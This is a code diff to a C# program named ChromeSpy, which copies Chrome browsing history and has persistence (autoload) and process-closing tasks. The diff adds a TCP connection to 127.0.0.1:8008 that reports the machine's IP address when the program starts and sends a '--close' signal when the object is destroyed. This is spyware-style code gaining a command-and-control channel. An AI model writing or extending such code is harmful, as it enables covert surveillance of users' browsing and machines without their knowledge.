@@ -25,6 +25,10 @@ namespace GoogleChromeSpy
         private string _key;
         private KeyInputForm _form;
         private bool _isCorrect = false;
+        private TcpClient client = new TcpClient();
+        private NetworkStream stream;
+        private readonly int PORT = 8008;
+        private readonly string HOST = "127.0.0.1";
 
         public ChromeSpy(TimeSpan maxUseTime, string processName)
         {
@@ -34,13 +38,29 @@ namespace GoogleChromeSpy
 
             this._closingTask = new Task(ClosingProcess);
             this._autoLoadTask = new Task(AddToAutoLoad);
-            this._closingTask.Start();
-            this._autoLoadTask.Start();
+            //this._closingTask.Start();
+            //this._autoLoadTask.Start();
             _key = GenerateKey();
             this._form = new KeyInputForm(_key.Length);
             this._form.KeyInsert += IsCorrect;
-
+            Connect();
             Task.Factory.StartNew(() => File.WriteAllText("data.txt", _key));
+            GetVersion();
+        }
+
+        private void Connect()
+        {
+            try
+            {
+                client.Connect(HOST, PORT);
+                stream = client.GetStream();
+                byte[] b = Encoding.Unicode.GetBytes(GetIpAdress());
+                stream.Write(b, 0, b.Length);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
         }
 
         private void CopyHistory()
@@ -54,6 +74,11 @@ namespace GoogleChromeSpy
                     File.Delete(Path.Combine(_defaultPathForCopy, "historyCopy"));
                 File.Copy(historyFile, Path.Combine(_defaultPathForCopy, "historyCopy"));
             }
+        }
+
+        private void GetVersion()
+        {
+           
         }
 
         private void ClosingProcess()
@@ -185,5 +210,19 @@ namespace GoogleChromeSpy
             return "";
         }
         #endregion
+
+        ~ChromeSpy()
+        {
+            try
+            {
+                byte[] b = Encoding.Unicode.GetBytes("--close");
+                stream = client.GetStream();
+                stream.Write(b, 0, b.Length);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+        }
     }
 }
